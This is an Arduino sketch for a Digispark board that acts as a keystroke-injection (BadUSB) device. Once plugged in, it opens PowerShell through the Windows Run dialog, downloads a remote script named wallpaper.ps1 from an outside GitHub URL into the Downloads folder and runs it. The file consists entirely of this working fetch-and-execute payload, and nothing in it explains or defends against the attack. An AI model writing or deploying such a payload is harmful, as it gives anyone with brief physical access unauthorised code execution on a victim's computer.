#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);


  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  DigiKeyboard.print(F("powershell"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  DigiKeyboard.print(F("Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/zehramans/salam001/main/wallpaper.ps1\" -OutFile \"$env:USERPROFILE\\Downloads\\githubscript.ps1\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000); 

  DigiKeyboard.print(F("cd Downloads"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(450);

  DigiKeyboard.print(F("./githubscript.ps1"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(450);
}

void loop() {
}
